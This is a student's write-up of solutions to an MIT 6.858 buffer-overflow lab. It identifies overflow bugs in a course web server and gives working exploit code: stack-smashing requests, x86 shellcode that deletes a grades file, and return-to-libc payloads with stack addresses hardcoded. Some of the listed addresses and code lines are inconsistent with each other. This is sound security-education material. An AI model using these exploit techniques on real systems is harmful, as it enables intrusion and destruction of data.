# MIT 6.858 Lab 1 Buffer Overflows Solutions (Fall2014)

## Part 1 Finding buffer overflows

### Excercise 1. 

Description:
```
Study the web server's code, and find examples of code vulnerable to memory corruption through a buffer
overflow. Write down a description of each vulnerability in the file /home/httpd/lab/bugs.txt; use the format
described in that file. For each vulnerability, describe the buffer which may overflow, how you would structure the
input to the web server (i.e., the HTTP request) to overflow the buffer, and whether the vulnerability can be prevented
using stack canaries. Locate at least 5 different vulnerabilities.
You can use the command make check-bugs to check if your bugs.txt file matches the required format, although the
command will not check whether the bugs you listed are actual bugs or whether your analysis of them is correct.
```

Finding bugs:

1. [zookd.c:70] [http.c:105] [http.c:437]
   
   These three positions refer to the same bug here, i.e., the bug at line 437, the 'url_decode' function in file [http.c](./lab1/http.c).

   At line 70 of [zookd.c](./lab1/zookd.c)

   ```c
   if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
        return http_err(fd, 500, "http_request_line: %s", errmsg);
   ```

   calls the 'http_request_line' function in http.c

    ```c
    const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
    {
        /* unrelevant codes  */

        url_decode(reqpath, sp1); # buffer overflow

        /* unrelevant codes */
    }
    ```

    Looking at the 'url_decode' function
    ```c
    void url_decode(char *dst, const char *src)
    {
        for (;;)
        {
            if (src[0] == '%' && src[1] && src[2])
            {
                char hexbuf[3];
                hexbuf[0] = src[1];
                hexbuf[1] = src[2];
                hexbuf[2] = '\0';

                *dst = strtol(&hexbuf[0], 0, 16);
                src += 3;
            }
            else if (src[0] == '+')
            {
                *dst = ' ';
                src++;
            }
            else
            {
                *dst = *src;
                src++;

                if (*dst == '\0')
                    break;
            }

            dst++;
        }
    }
    ```

    there is not bound checking for the 'char *dst', thus a long enough 'char *src' might overwrite the 'dst' character. In this scope, the 'char reqpath[2048]', which is on the stack, might be used for smashing the stack.

2. [http.c:159]
   
   Basically the same bug as the first bug. The bug in 'url_decode' function.

   ```c
   159: url_decode(value, sp);
   ```

   This function may use the 'sp' to overflow the 'value'.

3. [http.c:107]
   
   ```c
   envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
   ```

   The 'reqpath' variable may be too long to exceed the limit of static variable 'envp', causing a heap overflow.

4. [http.c:283]
   
   In the 'http_serve' function of [http.c](./lab1/http.c) at line 273, the 'strcat' function is called at line 283

   ```c
   strcat(pn, name);
   ```

   Since the 'strcat' function allows characters of arbitrary lengths to be appended, this function call may exceed the limit of 'pn' variable, thus causing a buffer overflow.

5. [http.c:358] [http.c:343]
   
   At line 358 of [http.c](./lab1/http.c), the 'http_serve_directory' function calls the 'dir_join' function.
   The vulnerability here is due to the 'strcpy' function used in the 'dir_join' function. The 'strcpy' function copies the 'src' variable to 'dst' variable without bounds checking. Therefore, in this function

   ```c
   char name[1024];

   /* unrelevant codes */

   dir_join(name, pn, indices[i]);
   ```

   the long enough 'pn' variable may overflow the 'name' variable.

   And the 'http_serve_directory' is called in the 'http_serve' function at line 291 of [http.c](./lab1/http.c) as a handler for http_serve.

6. [http.c:159]
   
   The same vulnerability as bug 2, caused by the use of 'url_decode' function.

   ```c
   const char *http_request_headers(int fd)
   {
    static char buf[8192];      /* static variables are not on the stack */
    int i;
    char value[512];
    char envvar[512];

    /* unrelevant codes */

    url_decode(value, sp);
    
    /* unrelevant codes */

   }
   ```
   The 'sp' variable can be used to overflow the 'value' variable, thus changing the value of 'envvar' variable. The 'envvar' variable is later used to set the environment variable.

### Exercise 2.

Description:
```
Pick two buffer overflows out of what you have found for later exercises (although you can change your
mind later, if you find your choices are particularly difficult to exploit). The first must overwrite a return address on the
stack, and the second must overwrite some other data structure that you will use to take over the control flow of the
program.

Write exploits that trigger them. You do not need to inject code or do anything other than corrupt memory past the end
of the buffer, at this point
```

Exploiting bugs:

Before diving into exploiting these bugs, we need to first clear out how the bugs are triggered.

The request sent by the HTTP client follows the form as 

```
[METH] [REQUEST-URL] HTTP/[VER]
```

where the METH refers to the request method, such as GET, POST and etc. The REQUEST-URL refers to the identifier of the document on the server. VER is the version of HTTP protocol.

A typical example is shown below

```
GET /foo.txt HTTP/1.0
```

The [zookd.c](./lab1/zookd.c) handles the process of the client using the function 'process_client'. The bug in [zookd.c](./lab1/zookd.c) is at the line 70 where it calls the function 'http_request_line'. The detail of this function is defined at line 64 of [http.c](./lab1/http.c). 

```c
65: char reqpath[2048];
66: const char *errmsg;
67: int i;

    /* get the request line */
70: if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
```

'http_request_line' decodes the REQUEST-URL and stores it at the 'reqpath' variable. However, as is shown in Excercise 1, this function exhibits no bounds checking and can store characters of arbitrary length at the 'reqpath', an overflow can be triggered.

If we send a REQUEST-URL of an appropriate length, nothing weird happens and the execution process is forwarded to line 73 at [zookd.c](./lab1/zookd.c).


```c
73: for (i = 0; i < nsvcs; ++i)
    {
        if (!regexec(&svcurls[i], reqpath, 0, 0, 0))
        {
            warnx("Forward %s to service %d", reqpath, i + 1);
            break;
        }
    }
```

In executing this code, [zookd.c](./lab1/zookd.c) forwards all the services to be handled by [zookfs.c](./lab1/zookfs.c), which decodes the HTTP headers and serves the requests.

At line 44 of [zookfs.c](./lab1/zookfs.c), the 'http_request_headers' function is called to handled the headers, which might trigger the bug 6 as mentioned in Excercise 1. And at line 47 of [zookfs.c](./lab1/zookfs.c), the 'http_serve' function is called to handle the request.

```c
44: if ((errmsg = http_request_headers(sockfd)))
        http_err(sockfd, 500, "http_request_headers: %s", errmsg);
    else
47:     http_serve(sockfd, getenv("REQUEST_URI"));
```

The detailed implementation of 'http_serve' can be found at line 273 of [http.c](./lab1/http.c).

```c
273:void http_serve(int fd, const char *name)
    {
        void (*handler)(int, const char *) = http_serve_none;
        char pn[1024];
        struct stat st;

        /* unrelevant codes */

        strcat(pn, name);

        /* unrelevant codes */

        if (!stat(pn,&st))
        {
            if (valid_cgi_script(&st))
                handler = http_serve_executable;
            else if (S_ISDIR(st.st_mode))
                handler = http_serve_directory;
            else
                handler = http_serve_file;
        }
        handler(fd, pn);
    }
```
As is shown in bug 4 in Excercise 1, the 'strcat' function may use the 'name' variable to overwrite the 'pn' variable, thus changing the value of 'struct stat st', which is used to determine the handler of the 'http_serve'.

In the calling of 'http_serve', the appropriate REQUEST-URL decoded in [zookd.c](./lab1/zookd.c) is transferred to 'http_serve' as the 'name' variable. Therefore, so long as the length of 'name', i.e., REQUEST-URL, does not exceed the length of 'pn', i.e., 1024, meaning that the 'st' variable is not modified, the appropriate HTTP handlers are called. And if the length of 'REQUEST-URL' exceeds 1024, the 'st' variable is modified and the 'http_serve_none' handler is called, which raises an error in HTTP server.

To summarize, triggering the vulnerability in the HTTP server can be used in at least two ways

* The length of REQUEST-URL > 2048
* 1024 < the length of REQUEST-URL < 2048

1. overwrite a return address
   
   In the 'process_client' client of [zookd.c](lab1/zookd.c)

   ```c
    char reqpath[2048];
    const char *errmsg;
    int i;

    /* get the request line */
    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
   ```

   The 'errmsg' variable is usually NULL. Therefore, the run-time stack is (the order follows top-down format of a stack)

   * stack frame of 'http_request_line' function
   * saved ebp, 32-bit
   * return address of 'http_request_line', 32-bit from gdb
   * int i, 32-bit 
   * const char *errmsg, 32-bit from gdb
   * reqpath, allocated 2048 bytes

   Therefore, if we send a REQUEST-URL of more than $2048+4+4+4=2060$ bytes (reqpath+errmsg+i), we can overwrite the return address of 'http_request_line'.

   Thus, in [exploit-2a.py](lab1/exploit-2a.py), the HTTP request can be

   ```python
    req = "GET /" + 'A'*2064+ " HTTP/1.0\r\n" + \
	    "\r\n"
   ```


2. take over the control flow of the program.
   
   In this exploit, we do not want to cause a vulnerability in [zookd.c](lab1/zookd.c) by overwriting a return address. Thus, the length of REQUEST-URL must be less than 2048.

   As shown previously, so long as the length of REQUEST-URL is in the range of (1024,2048), in  the 'http_serve' function in [http.c](lab1/http.c)

   ```c
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name);
   ```

   the REQUEST-URL is passed as the 'name' variable and can be used to overwrite the 'struct stat st' variable to control which HTTP handler to be used.

   Thus, in [exploit-2b.py](lab1/exploit-2b.py), the HTTP request can be

   ```python
    req = "GET /" + 'A'*1500+ " HTTP/1.0\r\n" + \
	    "\r\n"
   ```
   
## Part 2 Code injection

### Exercise 3

Description:
```
construct an exploit that hijacks control flow of the web
server and unlinks /home/httpd/grades.txt. Save this exploit in a file called exploit-3.py.
```

According to the description in this lab, we shall modify the [shellcode.S](./lab1/shellcode.S) file for it to cater to our customized system call, which is the unlink function.

> The detailed description of why and how the shell code works can be seen in [Smashing the Stack for Fun and Profit](http://phrack.org/issues/49/14.html#article)

Since this code is targeted for hijack the control flow, we used the vulnerable in function 'http_request_headers', i.e., the 'value' variable to overwrite the return address and inject our code (bug #4 in Exercise 1). 
So that our steps include the following:

1. get the address of variable 'value'.
   
   use the following gdb commands:

   ```bash
   gdb -p $(pgrep zookfs-exstack)
   (gdb) b http_request_headers
   (gdb) c
   (gdb) layout split
   (gdb) p &value 
   ```
   
   we get

   ```bash
   (gdb) p &value
   $1 = (char (*)[512]) 0xbfffdbf4
   ```

   such that we get the address of 'value' is 0xbfffdbf4, which stays constant across program executions.

2. construct the corresponding shell code
   
   There are two different ways to unlink the file:

   * use 'execve' function

    ```bash
    execve("/usr/bin/unlink","~/grade.txt",NULL);
    ```

    or

    * use 'unlink' function

    ```bash
    unlink("~/grade.txt");
    ```

    First, let's go with the simpler one: use 'unlink' function. This is rather easy, since the needed modification to [shellcode.S](lab1/shellcode.S) is

    ```asm
    #include <sys/syscall.h>

    #define STRING  "/home/httpd/grades.txt"
    #define STRLEN  22
    #define ARGV    (STRLEN+1)
    #define ENVP    (ARGV+4)

    .globl main
            .type   main, @function

    main:
            jmp     calladdr

    popladdr:
            popl    %esi
            movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
            xorl    %eax,%eax               /* get a 32-bit zero value */
            movb    %al,(STRLEN)(%esi)      /* null-terminate our string */
            movl    %eax,(ENVP)(%esi)       /* set up null envp */

            movb    $SYS_unlink,%al         /* syscall arg 1: syscall number */
            movl    %esi,%ebx               /* syscall arg 2: string pathname */
            leal    ARGV(%esi),%ecx         /* syscall arg 2: argv */
            leal    ENVP(%esi),%edx         /* syscall arg 3: envp */
            int     $0x80                   /* invoke syscall */

            xorl    %ebx,%ebx               /* syscall arg 2: 0 */
            movl    %ebx,%eax
            inc     %eax                    /* syscall arg 1: SYS_exit (1), uses */
                                            /* mov+inc to avoid null byte */
            int     $0x80                   /* invoke syscall */

    calladdr:
            call    popladdr
            .ascii  STRING

    ```

    As we can see from the assembly code above, the minor adjustments from the original shell code is that we change the STRING to "/home/httpd/grades.txt" and the SYS_call to SYS_unlink. 
    And we ran

    ```bash
    httpd@vm-6858:~/lab$ touch ../grades.txt
    httpd@vm-6858:~/lab$ ls ..
    grades.txt  lab
    httpd@vm-6858:~/lab$ make
    httpd@vm-6858:~/lab$ ./run-shellcode shellcode.bin 
    httpd@vm-6858:~/lab$ ls ..
    lab
    ```

    Alah! The targeted file is unlinked from the file system. However, this simple solution might bring a problem due to the sys_call, 'unlink'. Its number is 10, which represents the same bytes as the newline character '\n', which may raise problem in HTTP parsing.

    In the 'http_read_line' function,

    ```c
    if (buf[i] == '\n')
        {
            buf[i] = '\0';
            return 0;
        }
    ```

    the '\n' will be replaced by a termination character, causing our injected code to fail.

    Thus, we need to consider a more complex approach, i.e., using the 'execve' syscall.

    To use the 'exeve' syscall to execute the 'unlink' function, we need a c code as this

    ```c
    char *argv[3]={"/usr/bin/unlink","/home/httpd/grades.txt",NULL};
    execve(argv[0],argv,(char *)NULL);
    /* which is equivalent to */
    execve("/usr/bin/unlink",argv,(char *)NULL);
    ```

    So that we modify the [shellcode.S](lab1/shellcode.S) as following:

    ```asm
    include <sys/syscall.h>
    #define STRING  "/usr/bin/unlinkA/home/httpd/grades.txt"
    #define STRLEN  38      
    #define SECOND_ARG  16  /* the start offset of argv[1], the targeted file */
    #define ARGV    (STRLEN+1)
    #define ENVP    (ARGV+8)

    .globl main
            .type   main, @function

    main:
            jmp     calladdr

    popladdr:
            popl    %esi
            movl    %esi,(ARGV)(%esi)       /* set up argv pointer to pathname */
            leal    (SECOND_ARG)(%esi),%ebx
            movl    %ebx,(ARGV+4)(%esi)
            xorl    %eax,%eax               /* get a 32-bit zero value */
            movb    %al,(SECOND_ARG-1)(%esi)          /* seperate /usr/bin/unlink and /homehttpd/grades/txt */
            movb    %al,(STRLEN)(%esi)      /* null-terminate our string */
            movl    %eax,(ENVP)(%esi)       /* set up null envp */

            movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
            movl    %esi,%ebx               /* syscall arg 2: string pathname */
            leal    ARGV(%esi),%ecx         /* syscall arg 2: argv */
            leal    ENVP(%esi),%edx         /* syscall arg 3: envp */
            int     $0x80                   /* invoke syscall */

            xorl    %ebx,%ebx               /* syscall arg 2: 0 */
            movl    %ebx,%eax
            inc     %eax                    /* syscall arg 1: SYS_exit (1), uses */
                                            /* mov+inc to avoid null byte */
            int     $0x80                   /* invoke syscall */

    calladdr:
            call    popladdr
            .ascii  STRING
    ```

    We change the STRING as "/usr/bin/unlinkA/home/httpd/grades.txt". Note that here we do not use '\0' to separate two strings, for that '\0' will be intepreted as the termination character during HTTP parsing, which is not what we expect. So that we use 'A' to mark the separation, and use the following code to set it to  '\0'

    ```asm
    xorl    %eax,%eax               
    movb    %al,(SECOND_ARG-1)(%esi)
    ```

    Another thing is that different from the initial shell code program, here in the 'execve' arguments, the 'argv' argument has two needed values, i.e., argv[0] and argv[1], representing "/usr/bin/unlink" and "/home/httpd/grades.txt" respectively. So that to set the argv pointer, we need to set the pointers to both argv[0] and argv[1], using the following code

    ```c
    movl %esi,(ARGV)(%esi)      /* set the argv[0] pointer to the "/usr/bin/unlink" string */
    leal (SECOND_ARG)(%esi),%ebx    /* set the %ebx to the pointer to the string "/home/httpd/grades.txt" in STRING */
    movl %ebx,(ARGV+4)(%esi)    /* set the argv[1] pointer to the "/home/httpd/grades.txt" */
    ...
    movl %eax, (ENVP)(%esi)     /* set the argv[2] pointer to NULL as well as set up the null envp */
    ```

    Note that here, the assumption is that the machine is 32-bit (4 byte), such that ENVP=ARGV+8

    Now, we have obtained the desired shell code. Let us run some test on it:

    ```bash
    httpd@vm-6858:~/lab$ ls /home/httpd/
    lab
    httpd@vm-6858:~/lab$ touch /home/httpd/grades.txt
    httpd@vm-6858:~/lab$ ls /home/httpd/
    grades.txt  lab
    httpd@vm-6858:~/lab$ make
    make: Nothing to be done for 'all'
    httpd@vm-6858:~/lab$ ./run-shellcode shellcode.bin 
    httpd@vm-6858:~/lab$ ls /home/httpd/
    lab
    ```

    Alah! Success! And this binary code does not contain either '\0' or '\n'.

3. find the address of the tainted return value

    From step 1., we have already obtained the address of 'value', which is 0xbfffdbf4. 

    Thus, the next step we do is to obtain the address of the return value of the function 'http_request_headers', which is what we want to overwrite and is on the stack.

    Such that we use the following steps:

    * set a break point at the line 44 of [zookfs.c](lab1/zookfs.c)
    * layout the assembly code and find the return address of 'http_request_headers' function
    * set a break point at 'http_request_headers'
    * set a break point at the 'return 0' instruction of 'http_request_headers' function 
    * the value in %esp when reaching the return call is the address of where return value is stored.

    The commands are as follows:

    ```bash
    (gdb) b zookfs.c:44
    (gdb) c
    (gdb) layout split
    ```

    we can get

    ```bash
    0x8048d25 <main+376>    call   0x80490bd<http_request_headers>         
    0x8048d2a <main+381>    mov    %eax,0x2020(%esp)
    ```

    Such that the return address of 'http_request_headers' is 0x8048d2a

    Next, we dive into the 'http_request_headers' function. As we can get from the source code of [http.c](lab1/http.c), we can set a break point at line 172, which is equivalent to setting a break point at the ret call of 'http_request_headers' in the assembly code.

    And we can also watch the %esp register to see its refreshed updates, and use the 'layout regs' command to see all the values of registers (or just print the value of %esp).

    ```bash
    (gdb) b http.c:172
    Breakpoint 3 at 0x8049108: file http.c, line 172.
    (gdb) watch $esp
    Watchpoint 4: $esp
    (gdb) c
    (gdb) layout regs
    ```

    When reaching the ret call at 
    
    ```asm
    0x8049298 <http_request_headers+475>    ret
    ```

    the value of %esp is 0xbfffde0c, which is the address of the return value on the stack. To verify this, we can use

    ```bash
    (gdb) x $esp
    0xbfffde0c:     0x08048d2a
    ```

    Wow! This is exactly the return address of the 'http_request_headers' function. And we must overflow the buffer to overwrite the address of 0xbfffde0c.

4. construct the exploit
    
    Now, let's see what we've got. 

    1. shellcode and its binary
    2. the address of the exploited buffer: 0xbfffdbf4
    3. the address of the return value, which we must overwrite: 0xbfffde0c

    With the three elements, we are able to construct our exploit.

    To construct a exploit code, we need to

    1. write the shell code (which is to be executed) to the start of the buffer
    2. fill the rest of the buffer with some arbitrary characters until reaching the address of return value
    3. write the address of the buffer to the address of the return value, thus once returned, the control flow will be directed to execute our code stored at the start of the buffer.

    Thus, our constructed code is:

    ```python
    # unrelevant code
    stack_buffer = 0xbfffdbf4
    stack_retaddr = 0xbfffde0c

    def build_exploit(shellcode):
        fill_code = "A"*(stack_retaddr-stack_buffer-len(shellcode))
        buffer_addr = struct.pack("<I", stack_buffer)
        fd = struct.pack("<I", 3)
        req = "GET / HTTP/1.0\r\n" + \
              "EXP: " + shellcode + fill_code + buffer_addr + fd + "\r\n" \
              "\r\n"
        return req
    ```

    Note that here, we add the code

    ```python
    fd = struct.pack("<I", 3)
    ```

    This is because that the address of the stored file descriptor, fd, is 0xbfffde10, which is adjacent to the stack_retaddr. And the vulnerability we are exploiting is

    ```c
    url_decode(value, sp)
    ```

    If we look carefully at the 'url_decode' function, the function copies 'src' to 'dst' until the termination character '\0', which will overwrite one byte more than the length of exploited string.

    ```c
    else
    {
        *dst = *src;
        src++;

        if (*dst == '\0')
            break;
    }
    ```
    Thus, if we do not add the 'fd' variable, then we write 
    the 'stack_buffer' variable to the address of 0xbfffde0c, occupying the address from 0xbfffde0c to 0xbfffde0f. And after this, the 'url_decode' function writes the termination character '\0' right after 0xbfffde0f, i.e., writing 0x0 to 0xbfffde10, which is exactly the address of 'fd' variable, thus setting it from 3 to 0. This slight little bug will crash the 'http_read_line' function since 'fd = 0' does not exist in the socket connection. 

> A little note on debugging on Exercise 2: 
> 
> The debugging process typically requires 3 bash shells: one for starting the server, one for sending exploited codes, one for debug the zookfs process.
>
> First, start the serve. Second, run gdb -p $(pgrep zookfs-exstack), and set a break point on where you want to debug, and type continue. Third, send the exploit code and you will see the gdb bash shell is ready for debugging. 
> 
> (If you need to debug zookd process, open another shell and run gdb -p $(pgrep zookd-exstack), remember to run this gdb process before zookfs)

    However, if we run the process above, we still do not get the PASS result. How is this? After some painful debugging process, I found out the pretty imperceptible bug. The process is shown below.
    
    Using the shellcode.S above, and we ran the hexdump command to see its hexadecimal results, we get

    ```bash
    httpd@vm-6858:~/lab$ hexdump -C shellcode.bin 
    00000000  eb 28 5e 89 76 27 8d 5e  10 89 5e 2b 31 c0 88 46  |.(^.v'.^..^+1..F|
    00000010  0f 88 46 26 89 46 2f b0  0b 89 f3 8d 4e 27 8d 56  |..F&.F/.....N'.V|
    00000020  2f cd 80 31 db 89 d8 40  cd 80 e8 d3 ff ff ff 2f  |/..1...@......./|
    00000030  75 73 72 2f 62 69 6e 2f  75 6e 6c 69 6e 6b 41 2f  |usr/bin/unlinkA/|
    00000040  68 6f 6d 65 2f 68 74 74  70 64 2f 67 72 61 64 65  |home/httpd/grade|
    00000050  73 2e 74 78 74                                    |s.txt|
    00000055
    ```

    This looks pretty normal, right? But, if we use gdb to see the execution of our exploited code, we get a instruction as following

    ```bash
    0xbfffdbfd      mov    %ebx,0x20(%esi)
    ```

    This byte representation of this instruction is 

    ```
    89 5e 20
    ```

    However, in our shellcode.bin, the instruction should be

    ```
    89 5e 2b
    ```

    The inconsistency here makes the instruction incorrect, thus making our code not execute in the right way. Why is this?

    We can answer by looking at the 'url_decode' function

    ```c
    else if (src[0] == '+')
    {
        *dst = ' ';
        src++;
    }
    ```

    Huh! As long as there is a '+' in our code, it will be replaced by an space. And 2b represents '+' is ascii, thus it is replaced by 2b, the ascii representation of the space.
    Aha! Now we have found this bug, and what we shall do is modify our shellcode.S file to change the length of our STRING, thus the modified shellcode.S shall be

    ```asm
    include <sys/syscall.h>
    #define STRING  "/usr/bin/unlinkA/home/httpd/grades.txtA"
    #define STRLEN  39

    // all the other stays the same

    movb    %al,(STRLEN-1)(%esi)     /* set the grades.txtA to grades.txt'\0' */
    movb    %al,(STRLEN)(%esi)      /* null-terminate our string */
    ```

    The exploit-3.py statys the same. And we run make check-exstack here, we will get a PASS

## Part 3 Return-to-libc attacks
### Exercise 4

Description
```
Starting from your two exploits in Exercise 2, construct two exploits that take advantage of those
vulnerabilities to unlink /home/httpd/grades.txt when run on the binaries that have a non-executable stack. Name
these new exploits exploit-4a.py and exploit-4b.py.
```

In this exercise, we used the same vulnerability as in Exercise 3, i.e., the 'url_decode' function in 'http_request_headers', and the vulnerability in #bug 1, i.e., the 'http_request_line' function in 'process_client' function.

The solution to the above two vulnerabilities are the same. We follow the instructions of [article here](http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf). What we expect in the stack (before attack) is as follows:

\[buf.......\]\[return address of to the caller\]\[the following stack\]

What what we want the stack to be is shown below: 

\[buf.......\]\[address of the 'unlink' syscall\]\[address of the 'exit' syscall\]\[the pointer to the "/home/httpd/grades.txt"\]\["/home/httpd/grades.txt\]

Thus, with the layout of the stack as this, when the function returns, it will execute the 'unlink' syscall, which uses the pointer to the argument (i.e., the "/home/httpd/grades.txt") and unlink the argument.

Therefore, what we need to do is to find the address of the buffers of 'value' variable for exploit-4a.py and 'reqpath' variable for exploit-4b.py, and find the return address of function 'http_request_headers' and function 'process_client'.

Using gdb, we can easily find these addresses.

```
&value = 0xbfffdbf4
ret_addr of http_request_headers = 0xbfffde0c
&reqpath = 0xbfffee08
ret_addr of process_client = 0xbffff1c
```

And another two addresses we need are the address of 'unlink' and 'exit' syscalls. We can also easily find these using gdb

```
(gdb) p unlink
(gdb) p exit
```

And what we can get

```
addr of unlink = 0x40102450
addr of exit = 0x400058150
```

Our two exploits are as follows:

exploit-4a.py

```python
stack_buffer = 0xbfffdbf4
#stack_saved_ebp = 0x12345678
stack_retaddr = 0xbfffde0c
unlink_addr = 0x40102450
exit_addr = 0x40058150
str_addr = stack_retaddr+0xc
args = "/home/httpd/grades.txt"

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    req =   "GET / HTTP/1.0\r\n" +\
             "EXP: " + "A"*(stack_retaddr-stack_buffer) + struct.pack("<I", unlink_addr) + struct.pack("<I", exit_addr) + struct.pack("<I", str_addr) + args + "\r\n"+\
            "\r\n"
    return req
```

exploit-4b.py
```python
stack_buffer = 0xbfffee08
#stack_saved_ebp = 0x12345678
stack_retaddr = 0xbffff61c
unlink_addr = 0x40102450
exit_addr = 0x40058150
args = "/home/httpd/grades.txt"
str_addr = stack_retaddr + 0xc

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    req =   "GET /" + "A"*(stack_retaddr-stack_buffer-1) + struct.pack("<I", unlink_addr) + struct.pack("<I", exit_addr) + struct.pack("<I", str_addr) + args + " HTTP/1.0\r\n" +\
            "\r\n"
    return req
```

And we run the check make-libc command under the ~/lab directory, and we get:

```bash
httpd@vm-6858:~/lab$ make check-libc 
./check-bin.sh
WARNING: bin.tar.gz might not have been built this year (2022);
WARNING: if 2022 is correct, ask course staff to rebuild bin.tar.gz.
tar xf bin.tar.gz
./check-part3.sh zook-nxstack.conf ./exploit-4a.py
PASS ./exploit-4a.py
./check-part3.sh zook-nxstack.conf ./exploit-4b.py
PASS ./exploit-4b.py
```

Alah! We have succeeded! Easy piece!


## Part4 Fixing buffer overflows and other bugs

### Exercise 5 and Exercise 6

The vulnerability mainly includes the 'url_decode', 'sprintf', 'strcat' functions. All these can be fixed with a enforced bounds checking, i.e., passing the buffer size as an argument that is later used in bounds checking.